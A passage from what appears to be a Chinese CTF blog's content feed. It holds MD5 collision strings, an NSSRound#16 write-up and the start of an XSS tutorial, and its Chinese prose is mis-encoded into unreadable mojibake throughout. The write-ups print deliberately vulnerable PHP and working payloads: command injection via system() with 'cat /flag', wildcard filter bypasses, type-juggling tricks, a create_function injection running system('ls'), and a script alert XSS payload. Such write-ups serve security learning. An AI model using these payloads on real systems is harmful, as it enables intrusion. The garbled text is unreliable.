%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br><span class="line">$s2 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab&quot;</span><br><span class="line">$s3 = &quot;%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%ed%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%a7%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%e6%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%16%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%33%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%6f%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab&quot;</span><br></pre></td></tr></table></figure></p><h1 id="æ•°ç»„ç»•è¿‡"><a href="#æ•°ç»„ç»•è¿‡" class="headerlink" title="æ•°ç»„ç»•è¿‡"></a>æ•°ç»„ç»•è¿‡</h1><p><code>å› ä¸ºmd5()å‚æ•°ä¸ºæ•°ç»„æ—¶å›è¿”å›falseé‚£ä¹ˆè¿™æ—¶md5(num2[])===md5(num1[])è¿™æ—¶ä¼šè¿”å›false===falseè¿™æ ·å°±å¯ä»¥ç»•è¿‡</code></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> å“ˆå¸Œ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å“ˆå¸Œ </tag>
            
            <tag> å“ˆå¸Œç¢°æ’ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nssround#16çš„å¤ç°</title>
      <link href="/2024/01/14/nssround-16/"/>
      <url>/2024/01/14/nssround-16/</url>
      
        <content type="html"><![CDATA[<h1 id="æˆ‘ä¸ªäººè®¤ä¸ºè¿™ä¸¤åˆ°é¢˜ç›®æ˜¯æœ‰çºªå½•çš„ä»·å€¼çš„"><a href="#æˆ‘ä¸ªäººè®¤ä¸ºè¿™ä¸¤åˆ°é¢˜ç›®æ˜¯æœ‰çºªå½•çš„ä»·å€¼çš„" class="headerlink" title="æˆ‘ä¸ªäººè®¤ä¸ºè¿™ä¸¤åˆ°é¢˜ç›®æ˜¯æœ‰çºªå½•çš„ä»·å€¼çš„"></a>æˆ‘ä¸ªäººè®¤ä¸ºè¿™ä¸¤åˆ°é¢˜ç›®æ˜¯æœ‰çºªå½•çš„ä»·å€¼çš„</h1><h1 id="RCEä½†æ²¡å®Œå…¨RCE"><a href="#RCEä½†æ²¡å®Œå…¨RCE" class="headerlink" title="RCEä½†æ²¡å®Œå…¨RCE"></a>RCEä½†æ²¡å®Œå…¨RCE</h1><p>ä¸Šæ¥çš„md5ç»•è¿‡å°±ä¸å¤šè®²ç›´æ¥è®²rec<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/f|l|a|g|\*|\?/i&#x27;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Hacker!!!!!!!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$shell</span>(<span class="variable">$cmd</span>));</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å…¶å°†å­—æ¯fï¼Œlï¼Œaï¼Œgï¼Ÿ*éƒ½è¿‡æ»¤äº†æˆ‘ä»¬ä¹Ÿå°±æ— æ³•ä½¿ç”¨bashæˆ–è€…shæ¥ç»•è¿‡ï¼Œä¹Ÿæ— æ³•ä½¿ç”¨å¸¸ç”¨çš„æ–¹æ³•ï¼Œæˆ‘æŸ¥äº†ä»¥ä¸‹wpæœ‰ä»¥ä¸‹ä¸¤ç§é¢˜è§£</p><h1 id="1-9-q-ç»•è¿‡"><a href="#1-9-q-ç»•è¿‡" class="headerlink" title="1.[9-q]ç»•è¿‡"></a>1.<code>[9-q]ç»•è¿‡</code></h1><p><code>[9-q]</code>åœ¨linuxé‡Œä»£è¡¨äº†asciiåœ¨9-qä¹‹é—´çš„å­—ç¬¦ï¼Œä¸é€šé…ç¬¦ç›¸ä¼¼æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¯¥æ–¹æ³•è¿›è¡Œç»•è¿‡<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=more /[9-q][9-q][9-q][9-q]</span><br><span class="line">shell=system</span><br></pre></td></tr></table></figure></p><h1 id="2-ä½¿ç”¨-POSTç»•è¿‡"><a href="#2-ä½¿ç”¨-POSTç»•è¿‡" class="headerlink" title="2.ä½¿ç”¨$_POSTç»•è¿‡"></a>2.ä½¿ç”¨$_POSTç»•è¿‡</h1><p>æˆ‘ä»¬å¯ä»¥ç»™shellä¼ å€¼ä¸ºurldecodä½¿shell()å¤±æ•ˆã€‚<br>åœ¨ç»™cmdä¼ å€¼system($_POST[1]);<br>æœ€åç»™1ä¼ å€¼å³å¯ç”±äº1æ²¡æœ‰è¢«wafè¿‡æ»¤ä½¿ç”¨æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨1é‡Œä½¿ç”¨cat /flag</p><h1 id="äº†è§£è¿‡phpç‰¹æ€§å—"><a href="#äº†è§£è¿‡phpç‰¹æ€§å—" class="headerlink" title="äº†è§£è¿‡phpç‰¹æ€§å—"></a>äº†è§£è¿‡phpç‰¹æ€§å—</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;rce.php&quot;</span>);</span><br><span class="line"><span class="variable">$checker_1</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_2</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_3</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$checker_4</span> = <span class="literal">FALSE</span>;</span><br><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;no!!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">    <span class="variable">$checker_1</span> = <span class="literal">TRUE</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$ctype</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctype&#x27;</span>]);</span><br><span class="line">    <span class="variable">$is_num</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;is_num&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$ctype</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$is_num</span>) &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$ctype</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$is_num</span>)) &#123;</span><br><span class="line">        <span class="variable">$checker_2</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_114</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;114&#x27;</span>];</span><br><span class="line"><span class="variable">$_514</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;514&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_114</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$_114</span>) &gt; <span class="number">114514</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$_114</span>) &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$_514</span>) &amp;&amp; <span class="variable">$_514</span> &gt; <span class="number">9999999</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_3</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$arr4y</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;arr4y&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$arr4y</span>)) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$arr4y</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$arr4y</span>[<span class="variable">$i</span>] === <span class="string">&quot;NSS&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$arr4y</span>[<span class="variable">$i</span>] = <span class="title function_ invoke__">intval</span>(<span class="variable">$arr4y</span>[<span class="variable">$i</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">array_search</span>(<span class="string">&quot;NSS&quot;</span>, <span class="variable">$arr4y</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="variable">$checker_4</span> = <span class="literal">TRUE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$checker_1</span> &amp;&amp; <span class="variable">$checker_2</span> &amp;&amp; <span class="variable">$checker_3</span> &amp;&amp; <span class="variable">$checker_4</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$rce</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬çœ‹ä»£ç å¯ä»¥å‘ç°æœ‰å››å±‚æ£€æŸ¥<br>1.ä½¿intvalå‡½æ•°æˆ‘ä»¬ç›´æ¥ä½¿ç”¨æ•°ç»„ç»•è¿‡å°±å¯ï¼Œintvalåœ¨é‡åˆ°æ•°ç»„æ—¶å›ç›´æ¥è¿”å›1</p><p>2.æˆ‘ä»¬ä½¿ç”¨md5å€¼ä¸º0eå¼€å¤´çš„æ¥ç»•è¿‡ï¼Œis_numè¦ä¸ºæ•°å­—ï¼Œå…¶æ¬¡æˆ‘ä»¬éœ€è¦å°†ä¼ å…¥çš„å€¼å€’åºï¼Œæˆ‘ä»¬ç›´æ¥æŸ¥å°±å¯ä»¥äº†</p><p>3.ç¬¬ä¸€ä¸ª114æˆ‘ä»¬ä½¿ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡ï¼Œä¼ å€¼ä¸º2e8<br>514å¯ä»¥ä½¿ç”¨9999999999aæ¥ç»•è¿‡<br>4.æˆ‘ä»¬ç›´æ¥ç»™æ•°ç»„arr4[]éšä¾¿ä¼ å€¼åªè¦ä¸ä¸ºnss<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$nss</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;nss&#x27;</span>];</span><br><span class="line"><span class="variable">$shell</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;shell&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$shell</span>)&amp;&amp; <span class="keyword">isset</span>(<span class="variable">$nss</span>))&#123;</span><br><span class="line">    <span class="variable">$nss_shell</span> = <span class="title function_ invoke__">create_function</span>(<span class="variable">$shell</span>,<span class="variable">$nss</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨create_functionæ³¨å…¥<br>ç½‘ç«™å¦‚ä¸‹<br><a href="https://www.cnblogs.com/-chenxs/p/11459374.html">create_functionæ³¨å…¥</a><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">;&#125;system(&quot;ls&quot;);/*</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xssæ³¨å…¥</title>
      <link href="/2024/01/08/xss%E6%B3%A8%E5%85%A5/"/>
      <url>/2024/01/08/xss%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>xssSåˆå«CSSï¼ˆCross Site Scriptï¼‰è·¨ç«™è„šæœ¬æ”»å‡»æ˜¯æŒ‡æ¶æ„æ”»å‡»è€…å¾€Webé¡µé¢é‡Œæ’å…¥æ¶æ„Scriptä»£ç ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥é¡µä¹‹æ—¶ï¼ŒåµŒå…¥å…¶ä¸­Webé‡Œé¢çš„Scriptä»£ç ä¼šè¢«æ‰§è¡Œï¼Œä»è€Œè¾¾åˆ°æ¶æ„æ”»å‡»ç”¨æˆ·çš„ç›®çš„ã€‚</p><p>â€‹ xssæ¼æ´é€šå¸¸æ˜¯é€šè¿‡phpçš„è¾“å‡ºå‡½æ•°å°†javascriptä»£ç è¾“å‡ºåˆ°htmlé¡µé¢ä¸­ï¼Œé€šè¿‡ç”¨æˆ·æœ¬åœ°æµè§ˆå™¨æ‰§è¡Œçš„ï¼Œæ‰€ä»¥xssæ¼æ´å…³é”®å°±æ˜¯å¯»æ‰¾å‚æ•°æœªè¿‡æ»¤çš„è¾“å‡ºå‡½æ•°ã€‚</p><h1 id="xssçš„åŸç†"><a href="#xssçš„åŸç†" class="headerlink" title="xssçš„åŸç†"></a>xssçš„åŸç†</h1><p>è¯´èµ·xssæ„Ÿè§‰å’Œsqlæ³¨å…¥å¾ˆåƒï¼Œxssæ˜¯å°†ä¸€äº›æ¶æ„ä»£ç åµŒå…¥å‰ç«¯ä»£ç ä¸­ï¼Œå½“ç”¨æˆ·æµè§ˆè¯¥ç½‘é¡µæ—¶å°±ä¼šè§¦å‘è¯¥æ¶æ„è¯­å¥ï¼Œä¸€èˆ¬æ¶æ„è¯­å¥ä¸ºjsä»£ç ã€‚<br>ä¾‹å¦‚ä¸€ä¸ªç•™è¨€æ¿æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹è¿›è¡Œè¿‡æ»¤è¿™å°±ä¼šå¯¼è‡´å•é»‘å®¢åœ¨ç•™è¨€ç‰ˆé‡Œè¾“å…¥ä¸€äº›æ¶æ„è¯­å¥æ—¶ä¼šè¢«åç«¯ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œå½“æœ‰ç”¨æˆ·æµè§ˆè¯¥ç•™è¨€æ¿æ—¶ï¼Œåç«¯ä»£ç ä¼šå°†è¯¥æ¶æ„è¯­å¥è¾“å‡ºåˆ°webé¡µé¢ä¸Šå¯¼è‡´ç”¨æˆ·æ‰§è¡Œè¯¥ä»£ç ã€‚</p><h1 id="æ³¨å…¥ç‚¹"><a href="#æ³¨å…¥ç‚¹" class="headerlink" title="æ³¨å…¥ç‚¹"></a>æ³¨å…¥ç‚¹</h1><p>1.HTMLæ ‡ç­¾ä¹‹é—´<br><code>&lt;div&gt;</code>ï¼šå¯ä»¥ç›´æ¥å†™å…¥JSï¼Œwebä¼šç›´æ¥æ‰§è¡Œ<br><code>&lt;title&gt;``&lt;iframe&gt;</code>ç­‰åŒ…å«htmlEncodeåŠŸèƒ½çš„æ ‡ç­¾ï¼šå…ˆé—­åˆæ ‡ç­¾ï¼Œå†å†™å…¥JS</p><p>2.HTMLæ ‡ç­¾ä¹‹å†…<br>æ’å…¥ç‚¹åœ¨valueå†…ï¼Œtypeä¸ä¸ºhiddenï¼šç”±äºwebä¸ä¼šæ‰§è¡Œåœ¨valueå€¼å†…çš„JSä»£ç ï¼Œå› æ­¤è¦ä½¿JSä»Valueä¸­è·³å‡ºã€‚å¯ä»¥é‡‡ç”¨é—­åˆæ ‡ç­¾ç­‰å¤šç§æ–¹æ³•ã€‚<br>æ’å…¥ç‚¹åœ¨valueå†…ï¼Œtypeä¸ºhiddenï¼šç”±äºæ ‡ç­¾å†…å®¹ä¸å¯æ˜¾ç¤ºï¼Œè¿™æ—¶å¯ä»¥é—­åˆæ ‡ç­¾æˆ–è€…æ’å…¥æ–°çš„typeï¼ˆæœ‰ä¸¤ä¸ªç›¸åŒtypeæ—¶ç¬¬äºŒä¸ªå¤±æ•ˆï¼‰ã€‚</p><p>3.å…¶å®ƒæƒ…å†µ<br>å±æ€§å¯æ‰§è¡Œä¼ªåè®®ï¼šç›´æ¥è¾“å…¥JavaScript:è„šæœ¬å†…å®¹<br>eval()ï¼šä¼šç›´æ¥æ‰§è¡ŒJSè¯­å¥ï¼Œå› æ­¤å¯ä»¥ç›´æ¥è¾“å…¥è„šæœ¬å†…å®¹<br>åœ¨JSä»£ç ä¸­æ’å…¥ï¼šé—­åˆæ ‡ç­¾æˆ–è€…å±æ€§</p><h1 id="xssç±»å‹"><a href="#xssç±»å‹" class="headerlink" title="xssç±»å‹"></a>xssç±»å‹</h1><p>1.åå°„æ€§<br><img src="/2024/01/08/xss%E6%B3%A8%E5%85%A5/3.png" class="" title="Alt text"><br>åå°„æ€§xssæ¼æ´ï¼Œå°±æ˜¯é€šè¿‡è¯·æ±‚å‚æ•°æ¥ä½¿é¡µé¢è¾“å‡ºç›¸åº”çš„å†…å®¹ä¹Ÿå°±æ˜¯å°†jsè¯­å¥ä¼ åˆ°äº†åç«¯åœ¨ç”±åç«¯ä¼ åˆ°å‰ç«¯ï¼Œåå°„å‹xssæ˜¯ä¸€æ¬¡æ€§çš„ä¹Ÿå°±æ˜¯ä¸ä¼šè¢«å­˜å‚¨<br>å¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">å‰ç«¯</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>åå°„å‹xss<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;1.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        name:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;name&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">åç«¯<span class="number">1</span>.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$_POST</span>[name];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$name</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åƒè¿™æ ·çš„ä»£ç å½“æˆ‘ä»¬åœ¨è¾“å…¥æ¡†è¾“å…¥<code>&lt;script&gt; alert(&quot;hack&quot;) &lt;/script&gt;</code>æ—¶å°±ä¼šå¼¹å‡ºçª—å£</p><h1 id="å­˜å‚¨å‹"><a href="#å­˜å‚¨å‹" class="headerlink" title="å­˜å‚¨å‹"></a>å­˜å‚¨å‹</h1><img src="/2024/01/08/xss%E6%B3%A8%E5%85%A5/2.png" class="" title="Alt text"><p>å°†é»‘å®¢è¾“å…¥çš„ä»£ç å­˜å‚¨åˆ°æ•°æ®åº“ä¸­ã€‚<br>å½“ç”¨æˆ·æ‰“å¼€ç½‘é¡µæ—¶å°†ä»£ç è¾“å‡ºåˆ°ç”¨æˆ·çš„webé‡Œå¯¼è‡´è¯¥ä»£ç è¢«æµè§ˆå™¨è§£ææ‰§è¡Œã€‚è¿™å°±æ˜¯å­˜å‚¨å‹æ¼æ´<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">å‰ç«¯</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>åå°„å‹xss<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;1.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">        id:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> /&gt;</span></span><br><span class="line">        name:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span 